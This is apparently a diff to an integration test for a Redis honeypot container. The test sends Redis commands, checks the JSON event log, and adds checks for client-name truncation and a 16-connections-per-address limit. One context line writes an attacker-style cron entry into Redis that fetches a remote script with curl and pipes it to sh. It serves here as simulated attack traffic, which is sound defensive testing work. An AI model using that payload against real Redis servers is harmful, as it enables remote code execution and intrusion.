@@ -254,8 +254,29 @@ try:
         expect(request(sock, reader, "SET", "backup1", "\n\n*/2 * * * * curl -fsSL {} | sh\n\n".format(cron_url)), ("+", "OK"), "SET cron")
         expect(request(sock, reader, "SAVE"), ("+", "OK"), "SAVE")
         expect(request(sock, reader, "EVAL", "return 1", "0"), (":", "1"), "EVAL")
+        # the log keeps 128 bytes of a client name
+        expect(request(sock, reader, "CLIENT", "SETNAME", "n" * 500), ("+", "OK"), "CLIENT SETNAME")
         expect(request(sock, reader, "QUIT"), ("+", "OK"), "QUIT")
         reader.close()
+
+    # one source address gets 16 connections, the 17th is refused
+    held = []
+    try:
+        for _ in range(16):
+            conn = socket.create_connection((host, port), timeout=connect_timeout)
+            conn.settimeout(connect_timeout)
+            held.append(conn)
+            conn_reader = conn.makefile("rb")
+            expect(request(conn, conn_reader, "PING"), ("+", "PONG"), "PING of a held connection")
+            conn_reader.close()
+        with socket.create_connection((host, port), timeout=connect_timeout) as extra:
+            extra.settimeout(connect_timeout)
+            extra_reader = extra.makefile("rb")
+            expect(read_response(extra_reader), ("-", "ERR max number of clients reached"), "17th connection")
+            extra_reader.close()
+    finally:
+        for conn in held:
+            conn.close()
 except (OSError, RuntimeError, ValueError) as exc:
     fail("RedisHoneyPot Redis probe failed: {}".format(exc))
 
@@ -347,7 +368,10 @@ def load_events():
             raise RuntimeError("Lifecycle event in {}:{}: {!r}".format(log_file, line_number, event))
         if event.get("client_name") == "__redishoneypot_healthcheck__":
             raise RuntimeError("Healthcheck session logged in {}:{}".format(log_file, line_number))
-        for field in ("timestamp", "event", "session_id", "src_ip", "src_port", "dest_port"):
+        required = ("timestamp", "event", "src_ip", "src_port", "dest_port")
+        if event.get("event") != "refused":
+            required += ("session_id",)
+        for field in required:
             if field not in event:
                 raise RuntimeError("JSON event in {}:{} lacks {}: {!r}".format(log_file, line_number, field, event))
         if event.get("profile") != profile:
@@ -387,6 +411,11 @@ def check(events):
         missing.append("SAVE redis_write_file_commit with target_dir")
     if not find(ours, event="command", command="EVAL", script_sha1=script_sha1):
         missing.append("EVAL script_sha1")
+    setname = find(ours, event="command", command="CLIENT", client_subcommand="setname")
+    if not setname or setname.get("client_name") != "n" * 128 or setname.get("client_name_truncated") is not True:
+        missing.append("CLIENT SETNAME with client_name capped at 128 bytes")
+    if not find(events, event="refused", reason="max_clients_per_ip"):
+        missing.append("refused with reason max_clients_per_ip")
     close = find(ours, event="close")
     if not close or "session_end" not in close or close.get("session_command_count", 0) < 9:
         missing.append("close with session_end and session_command_count")
@@ -417,6 +446,9 @@ assert_stdout_lifecycle_only() {
   output="$(test_compose logs --no-color --no-log-prefix 2>/dev/null || true)"
   if ! grep -F '"event":"start"' <<< "${output}" | grep -F "\"profile\":\"${PROFILE}\"" | grep -q -F '"log_stdout":false'; then
     test_die "RedisHoneyPot start event with profile ${PROFILE} and log_stdout false missing in Docker logs"
+  fi
+  if ! grep -F '"event":"start"' <<< "${output}" | grep -F '"max_clients_per_ip":16' | grep -F '"max_data_bytes":33554432' | grep -q -F '"max_reply_bytes":33554432'; then
+    test_die "RedisHoneyPot start event lacks the limits of the image (16 clients per address, 32 MiB data and reply budgets)"
   fi
   if grep -q -E '"event":"(connect|command|close|protocol_error)"' <<< "${output}"; then
     test_die "RedisHoneyPot honeypot events found in Docker logs, they belong in redishoneypot.log only"
